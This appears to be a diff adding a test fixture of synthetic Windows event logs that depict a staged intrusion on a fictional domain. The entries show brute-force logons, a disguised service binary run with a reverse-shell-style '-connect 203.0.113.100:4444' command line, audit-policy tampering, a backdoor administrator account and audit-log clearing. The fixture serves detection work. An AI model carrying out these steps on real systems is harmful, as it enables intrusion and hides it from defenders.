@@ -1,0 +1,122 @@
+[
+  {
+    "EventID": 4625,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T08:20:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account failed to log on. Subject: CORP\\svc_backup Target: CORP\\administrator Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 10.10.1.50"
+  },
+  {
+    "EventID": 4625,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T08:20:05Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account failed to log on. Subject: CORP\\svc_backup Target: CORP\\administrator Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 10.10.1.50"
+  },
+  {
+    "EventID": 4625,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T08:20:10Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account failed to log on. Subject: CORP\\svc_backup Target: CORP\\administrator Logon Type: 10 Failure Reason: Unknown user name or bad password. Source Network Address: 10.10.1.50"
+  },
+  {
+    "EventID": 4740,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T08:20:15Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "A user account was locked out. Subject: SYSTEM Target Account Name: administrator Target Account Domain: CORP Caller Computer Name: WORKSTATION05"
+  },
+  {
+    "EventID": 4624,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T09:00:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account was successfully logged on. Subject: CORP\\jsmith Logon Type: 2 New Logon: CORP\\jsmith Workstation Name: WORKSTATION12 Source Network Address: 10.10.2.12"
+  },
+  {
+    "EventID": 4624,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T09:05:00Z"},
+    "Computer": "FILESERVER01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account was successfully logged on. Subject: CORP\\jsmith Logon Type: 3 New Logon: CORP\\jsmith Source Network Address: 10.10.2.12"
+  },
+  {
+    "EventID": 4672,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T09:10:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "Special privileges assigned to new logon. Subject: CORP\\admin_svc Privileges: SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"
+  },
+  {
+    "EventID": 7045,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T09:15:00Z"},
+    "Computer": "WORKSTATION05.corp.local",
+    "Source": "Service Control Manager",
+    "Message": "A service was installed in the system. Service Name: WindowsUpdateHelper Service File Name: C:\\Windows\\Temp\\svc_helper.exe Service Type: user mode service Service Start Type: auto start"
+  },
+  {
+    "EventID": 4688,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T09:16:00Z"},
+    "Computer": "WORKSTATION05.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "A new process has been created. Creator Subject: CORP\\svc_backup New Process Name: C:\\Windows\\Temp\\svc_helper.exe Process Command Line: svc_helper.exe -connect 203.0.113.100:4444"
+  },
+  {
+    "EventID": 4719,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:00:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "System audit policy was changed. Subject: CORP\\admin_svc Category: Logon/Logoff Subcategory: Logon Changes: Success removed"
+  },
+  {
+    "EventID": 4720,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:05:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "A user account was created. Subject: CORP\\admin_svc Target Account: CORP\\helpdesk_temp Attributes: User Account Control: Normal Account"
+  },
+  {
+    "EventID": 4732,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:05:30Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "A member was added to a security-enabled local group. Subject: CORP\\admin_svc Group: Administrators Member: CORP\\helpdesk_temp"
+  },
+  {
+    "EventID": 1102,
+    "Level": "Warning",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:10:00Z"},
+    "Computer": "WORKSTATION05.corp.local",
+    "Source": "Microsoft-Windows-Eventlog",
+    "Message": "The audit log was cleared. Subject: CORP\\svc_backup"
+  },
+  {
+    "EventID": 4624,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:30:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "An account was successfully logged on. Subject: CORP\\helpdesk_temp Logon Type: 10 New Logon: CORP\\helpdesk_temp Source Network Address: 203.0.113.100"
+  },
+  {
+    "EventID": 4648,
+    "Level": "Information",
+    "TimeCreated": {"SystemTime": "2025-01-15T10:35:00Z"},
+    "Computer": "DC01.corp.local",
+    "Source": "Microsoft-Windows-Security-Auditing",
+    "Message": "A logon was attempted using explicit credentials. Subject: CORP\\helpdesk_temp Target Server: FILESERVER01.corp.local Target Account: CORP\\administrator"
+  }
+]
